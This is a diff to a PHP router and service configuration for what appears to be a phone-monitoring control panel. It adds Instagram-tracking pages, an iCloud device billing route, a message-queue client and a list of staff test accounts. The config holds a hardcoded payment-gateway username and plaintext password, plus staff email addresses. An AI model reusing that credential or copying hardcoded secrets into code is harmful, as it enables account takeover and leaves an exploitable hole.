@@ -69,6 +69,7 @@ $di->setShared('router', function() use($config) {
     $router->add(Modules::APPLICATIONS, new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
     $router->add(Modules::SETTINGS, new \System\Router\Route('/cp/settings', array('controller' => 'DeviceSettings', 'action' => 'index')));
     $router->add(Modules::SMS_COMMANDS, new \System\Router\Route('/cp/smsCommands', array('controller' => 'SmsCommands', 'action' => 'index')));
+    $router->add(Modules::INSTAGRAM, new \System\Router\Route('/cp/instagram', array('controller' => 'Instagram', 'action' => 'index')));
     $router->add('activeDays', new \System\Router\Route('/cp/locations/activeDays', array('controller' => 'Locations', 'action' => 'disableDays')));
     $router->add('browserBlocked', new \System\Router\Route('/cp/browserBlocked', array('controller' => 'BrowserHistory', 'action' => 'browserBlocked')));
     $router->add('videosCamera', new \System\Router\Route('/cp/videos/camera', array('controller' => 'Videos', 'action' => 'camera')));
@@ -79,6 +80,7 @@ $di->setShared('router', function() use($config) {
     $router->add('billing', new \System\Router\Route('/billing', array('controller' => 'Billing', 'action' => 'index')));
     $router->add('billingAddDevice', new \System\Router\Route('/billing/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
     $router->add('billingAssignDevice', new \System\Router\Route('/billing/assignDevice', array('controller' => 'Billing', 'action' => 'assignDevice')));
+    $router->add('billingAddICloudDevice', new \System\Router\Route('/billing/addICloudDevice', array('controller' => 'Billing', 'action' => 'addICloudDevice')));
     $router->add('billingLicense', new \System\Router\Regex('/billing/license/:id', array('controller' => 'Billing', 'action' => 'license'), array('id' => '[0-9]+')));
     $router->add('billingLicenseDisable', new \System\Router\Regex('/billing/license/:id/disable', array('controller' => 'Billing', 'action' => 'disableLicense'), array('id' => '[0-9]+')));
     $router->add('billingLicenseEnable', new \System\Router\Regex('/billing/license/:id/enable', array('controller' => 'Billing', 'action' => 'enableLicense'), array('id' => '[0-9]+')));
@@ -102,6 +104,8 @@ $di->setShared('router', function() use($config) {
     $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[^/]+'))); //[-._@a-zA-Z0-9]{6,60}
     $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
     $router->add('locationsZonesEdit', new \System\Router\Regex('/cp/locations/zones/edit/:id', array('controller' => 'Locations', 'action' => 'index'), array('id' => '[0-9]+')));
+    $router->add('instagramTab', new \System\Router\Regex('/cp/instagram/:account/:tab', array('controller' => 'Instagram', 'action' => 'tab'), array('account' => '[0-9]+', 'tab' => 'own|friends|commented')));
+    $router->add('instagramPost', new \System\Router\Regex('/cp/instagram/:account/post/:post', array('controller' => 'Instagram', 'action' => 'view'), array('account' => '[0-9]+', 'post' => '[0-9]+')));
 
     $router->add('directLogin', new \System\Router\Route('/admin/login', array('controller' => 'Index', 'action' => 'directLogin', 'public' => true)));
 
@@ -166,5 +170,33 @@ $di->setShared('fastSpringGateway', function () {
     return $gateway->setStoreId($fastSpringConfig['storeId'])
                     ->setPrivateKey($fastSpringConfig['privateKey'])
                     ->setUserName('api@dizboard.com')//$fastSpringConfig['userName'])
-                    ->setUserPassword('c0RdI48G7Est');//$fastSpringConfig['userPassword']);
+                    ->setUserPassword('c0RdI48G7Est'); //$fastSpringConfig['userPassword']);
+});
+
+$di->setShared('queueClient', function () use($config) {
+    $queueConfig = GlobalSettings::getQueueConfig();
+
+    if ($config['environment'] == 'production') {
+        return new \CS\Queue\RabbitClient(
+                $queueConfig['host'], $queueConfig['port'], $queueConfig['user'], $queueConfig['password'], $queueConfig['vhost']
+        );
+    } else {
+        $queueClient = new \CS\Queue\QueueToFile;
+        $queueClient->setDirectory(__DIR__ . "/logs");
+        return $queueClient;
+    }
+});
+
+$di->set('isTestUser', function($id) use($config) {
+
+    if ($config['environment'] == 'production') {
+        return in_array($id, array(
+            1, //b.orest@dizboard.com
+            2, //pm@dizboard.com
+            10, //p.olya@dizboard.com
+            11 //g.zhenya@dizboard.com
+        ));
+    }
+
+    return true;
 });
